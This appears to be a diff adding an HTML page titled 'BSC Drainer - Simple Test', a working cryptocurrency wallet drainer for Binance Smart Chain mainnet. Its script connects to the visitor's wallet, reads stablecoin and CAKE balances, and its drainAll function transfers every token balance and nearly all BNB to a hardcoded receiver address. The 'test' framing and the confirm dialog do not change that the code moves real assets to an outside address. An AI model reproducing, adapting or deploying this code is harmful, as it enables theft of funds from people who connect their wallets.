@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BSC Drainer - Simple Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #F0B90B 0%, #FFC107 50%);
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        h1 {
+            color: #F0B90B;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .status {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 12px;
+            border-left: 4px solid #F0B90B;
+        }
+        button {
+            background: #F0B90B;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+            min-width: 150px;
+        }
+        button:hover {
+            background: #e6a607;
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .info {
+            background: #e3f2fd;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        .error {
+            background: #ffebee;
+            color: #c62828;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .success {
+            background: #e8f5e8;
+            color: #2e7d32;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 BSC Drainer - Simple Test</h1>
+        
+        <div id="status" class="status">
+            Ready to connect...
+        </div>
+        
+        <div style="text-align: center;">
+            <button onclick="connectWallet()" id="connectBtn">Connect Wallet</button>
+            <button onclick="testConnection()" id="testBtn" disabled>Test BSC Connection</button>
+            <button onclick="checkTokens()" id="tokenBtn" disabled>Check Tokens</button>
+            <button onclick="drainAll()" id="drainBtn" disabled>🎯 Drain Wallet</button>
+        </div>
+        
+        <div class="info">
+            <strong>BSC Test Info:</strong><br>
+            - Chain ID: 56 (BSC Mainnet)<br>
+            - Native Token: BNB<br>
+            - Test Tokens: USDT, USDC, BUSD, CAKE<br>
+            - Receiver: 0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49<br>
+            - Supported: MetaMask, Trust, Phantom, Binance, etc.
+        </div>
+        
+        <div id="results"></div>
+    </div>
+
+    <!-- Use jsDelivr CDN for more reliable loading -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    
+    <script>
+        let web3;
+        let userAccount;
+        const RECEIVER_ADDRESS = "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49";
+        
+        // BSC Test Tokens (reduced list for testing)
+        const TEST_TOKENS = [
+            { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+            { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
+            { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
+            { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 }
+        ];
+        
+        function updateStatus(message, type = 'info') {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = message;
+            statusEl.className = `status ${type}`;
+            console.log(message);
+        }
+        
+        function addResult(message, type = 'info') {
+            const resultsEl = document.getElementById('results');
+            const div = document.createElement('div');
+            div.className = type;
+            div.textContent = message;
+            resultsEl.appendChild(div);
+        }
+        
+        async function connectWallet() {
+            try {
+                // Check for Phantom wallet first
+                if (window.phantom && window.phantom.ethereum) {
+                    updateStatus('Phantom wallet detected, using Phantom provider...');
+                    web3 = new Web3(window.phantom.ethereum);
+                    
+                    // Request account access for Phantom
+                    const accounts = await window.phantom.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAccount = accounts[0];
+                } else if (typeof window.ethereum !== 'undefined') {
+                    updateStatus('Connecting to wallet...');
+                    web3 = new Web3(window.ethereum);
+                    
+                    // Request account access
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAccount = accounts[0];
+                } else {
+                    updateStatus('Web3 wallet not found. Please install MetaMask, Phantom, or similar.', 'error');
+                    return;
+                }
+                
+                updateStatus(`Connected: ${userAccount}`, 'success');
+                
+                // Enable other buttons
+                document.getElementById('testBtn').disabled = false;
+                document.getElementById('tokenBtn').disabled = false;
+                document.getElementById('drainBtn').disabled = false;
+                document.getElementById('connectBtn').textContent = 'Connected ✓';
+                
+                // Detect which wallet is being used
+                let walletName = 'Unknown Wallet';
+                if (window.phantom && window.phantom.ethereum && web3.currentProvider === window.phantom.ethereum) {
+                    walletName = 'Phantom Wallet';
+                } else if (window.ethereum) {
+                    if (window.ethereum.isMetaMask) walletName = 'MetaMask';
+                    else if (window.ethereum.isTrust) walletName = 'Trust Wallet';
+                    else if (window.ethereum.isCoinbaseWallet) walletName = 'Coinbase Wallet';
+                    else if (window.ethereum.isTokenPocket) walletName = 'TokenPocket';
+                    else if (window.ethereum.isSafePal) walletName = 'SafePal';
+                    else if (window.ethereum.isPhantom) walletName = 'Phantom Wallet';
+                }
+                
+                addResult(`✅ ${walletName} connected: ${userAccount}`, 'success');
+                
+            } catch (error) {
+                updateStatus(`Connection failed: ${error.message}`, 'error');
+                addResult(`❌ Connection error: ${error.message}`, 'error');
+            }
+        }
+        
+        async function testConnection() {
+            try {
+                updateStatus('Testing BSC connection...');
+                
+                // Check network
+                const chainId = await web3.eth.getChainId();
+                addResult(`Network Chain ID: ${chainId}`, chainId === 56 ? 'success' : 'error');
+                
+                if (chainId !== 56) {
+                    const switchNetwork = confirm('Not on BSC Mainnet. Switch to BSC?');
+                    if (switchNetwork) {
+                        try {
+                            await window.ethereum.request({
+                                method: 'wallet_switchEthereumChain',
+                                params: [{ chainId: '0x38' }]
+                            });
+                            addResult('✅ Switched to BSC Mainnet', 'success');
+                        } catch (switchError) {
+                            if (switchError.code === 4902) {
+                                // Add BSC network
+                                await window.ethereum.request({
+                                    method: 'wallet_addEthereumChain',
+                                    params: [{
+                                        chainId: '0x38',
+                                        chainName: 'BSC Mainnet',
+                                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                        blockExplorerUrls: ['https://bscscan.com/']
+                                    }]
+                                });
+                                addResult('✅ BSC network added and switched', 'success');
+                            }
+                        }
+                    }
+                }
+                
+                // Check BNB balance
+                const balanceWei = await web3.eth.getBalance(userAccount);
+                const bnbBalance = web3.utils.fromWei(balanceWei, 'ether');
+                addResult(`BNB Balance: ${parseFloat(bnbBalance).toFixed(4)} BNB`, 'info');
+                
+                // Check gas price
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasPriceGwei = web3.utils.fromWei(gasPrice, 'gwei');
+                addResult(`Gas Price: ${parseFloat(gasPriceGwei).toFixed(2)} gwei`, 'info');
+                
+                updateStatus('BSC connection test completed', 'success');
+                
+            } catch (error) {
+                updateStatus(`Test failed: ${error.message}`, 'error');
+                addResult(`❌ Test error: ${error.message}`, 'error');
+            }
+        }
+        
+        async function checkTokens() {
+            try {
+                updateStatus('Checking token balances...');
+                
+                const tokenABI = [
+                    {
+                        "constant": true,
+                        "inputs": [{"name": "_owner", "type": "address"}],
+                        "name": "balanceOf",
+                        "outputs": [{"name": "balance", "type": "uint256"}],
+                        "type": "function"
+                    }
+                ];
+                
+                for (const token of TEST_TOKENS) {
+                    try {
+                        const contract = new web3.eth.Contract(tokenABI, token.address);
+                        const balance = await contract.methods.balanceOf(userAccount).call();
+                        
+                        let displayBalance;
+                        if (balance === '0') {
+                            displayBalance = '0';
+                        } else {
+                            displayBalance = web3.utils.fromWei(balance, 'ether');
+                        }
+                        
+                        addResult(`${token.symbol}: ${parseFloat(displayBalance).toFixed(6)}`, balance === '0' ? 'info' : 'success');
+                        
+                    } catch (tokenError) {
+                        addResult(`${token.symbol}: Error - ${tokenError.message}`, 'error');
+                    }
+                }
+                
+                updateStatus('Token check completed', 'success');
+                
+            } catch (error) {
+                updateStatus(`Token check failed: ${error.message}`, 'error');
+                addResult(`❌ Token check error: ${error.message}`, 'error');
+            }
+        }
+        
+        async function drainAll() {
+            const confirmed = confirm(`⚠️ WARNING: This will transfer ALL assets from ${userAccount} to ${RECEIVER_ADDRESS}. Are you sure?`);
+            if (!confirmed) return;
+            
+            try {
+                updateStatus('Starting wallet drain...', 'info');
+                
+                // First drain tokens
+                let tokensTransferred = 0;
+                const tokenABI = [
+                    {
+                        "constant": true,
+                        "inputs": [{"name": "_owner", "type": "address"}],
+                        "name": "balanceOf",
+                        "outputs": [{"name": "balance", "type": "uint256"}],
+                        "type": "function"
+                    },
+                    {
+                        "constant": false,
+                        "inputs": [
+                            {"name": "_to", "type": "address"},
+                            {"name": "_value", "type": "uint256"}
+                        ],
+                        "name": "transfer",
+                        "outputs": [{"name": "", "type": "bool"}],
+                        "type": "function"
+                    }
+                ];
+                
+                for (const token of TEST_TOKENS) {
+                    try {
+                        updateStatus(`Draining ${token.symbol}...`);
+                        
+                        const contract = new web3.eth.Contract(tokenABI, token.address);
+                        const balance = await contract.methods.balanceOf(userAccount).call();
+                        
+                        if (balance !== '0') {
+                            const tx = await contract.methods.transfer(RECEIVER_ADDRESS, balance).send({
+                                from: userAccount,
+                                gas: 65000
+                            });
+                            
+                            addResult(`✅ ${token.symbol} transferred: ${tx.transactionHash}`, 'success');
+                            tokensTransferred++;
+                        } else {
+                            addResult(`⏭️ ${token.symbol}: No balance to transfer`, 'info');
+                        }
+                        
+                    } catch (tokenError) {
+                        addResult(`❌ ${token.symbol} transfer failed: ${tokenError.message}`, 'error');
+                    }
+                }
+                
+                // Then drain BNB
+                updateStatus('Draining BNB...');
+                
+                const balanceWei = await web3.eth.getBalance(userAccount);
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasLimit = 21000;
+                const gasCost = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(gasLimit));
+                const amountToSend = web3.utils.toBN(balanceWei).sub(gasCost);
+                
+                if (amountToSend.gt(web3.utils.toBN('0'))) {
+                    const bnbTx = await web3.eth.sendTransaction({
+                        from: userAccount,
+                        to: RECEIVER_ADDRESS,
+                        value: amountToSend.toString(),
+                        gas: gasLimit,
+                        gasPrice: gasPrice
+                    });
+                    
+                    addResult(`✅ BNB transferred: ${bnbTx.transactionHash}`, 'success');
+                } else {
+                    addResult(`⏭️ Insufficient BNB for transfer after gas costs`, 'info');
+                }
+                
+                updateStatus(`Drain completed! Transferred ${tokensTransferred} tokens + BNB`, 'success');
+                addResult(`🎉 Wallet drain completed successfully!`, 'success');
+                
+            } catch (error) {
+                updateStatus(`Drain failed: ${error.message}`, 'error');
+                addResult(`❌ Drain error: ${error.message}`, 'error');
+            }
+        }
+        
+        // Check if Web3 is available on page load
+        window.addEventListener('load', () => {
+            if (window.phantom && window.phantom.ethereum) {
+                updateStatus('Phantom wallet detected. Click "Connect Wallet" to begin.', 'info');
+            } else if (typeof window.ethereum !== 'undefined') {
+                updateStatus('Web3 wallet detected. Click "Connect Wallet" to begin.', 'info');
+            } else {
+                updateStatus('No Web3 wallet found. Please install MetaMask, Phantom, or similar.', 'error');
+            }
+        });
+    </script>
+</body>
+</html>
